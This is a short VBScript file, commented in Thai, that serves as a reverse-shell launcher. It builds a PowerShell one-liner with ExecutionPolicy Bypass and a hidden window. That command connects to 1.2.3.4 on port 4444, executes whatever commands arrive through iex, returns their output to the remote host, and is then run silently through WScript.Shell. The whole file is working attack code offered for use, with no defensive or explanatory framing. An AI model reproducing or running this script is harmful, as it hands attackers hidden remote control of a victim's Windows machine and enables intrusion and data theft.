Set objShell = CreateObject("WScript.Shell")
' คำสั่ง PowerShell สำหรับสร้าง Reverse Shell แบบ One-Liner
psCommand = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""$client = New-Object System.Net.Sockets.TCPClient('1.2.3.4',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbackBytes = ([System.Text.Encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbackBytes,0,$sendbackBytes.Length);$stream.Flush()};$client.Close()"""

' สั่งรันคำสั่งผ่าน Shell ของ Windows
objShell.Run psCommand, 0, False
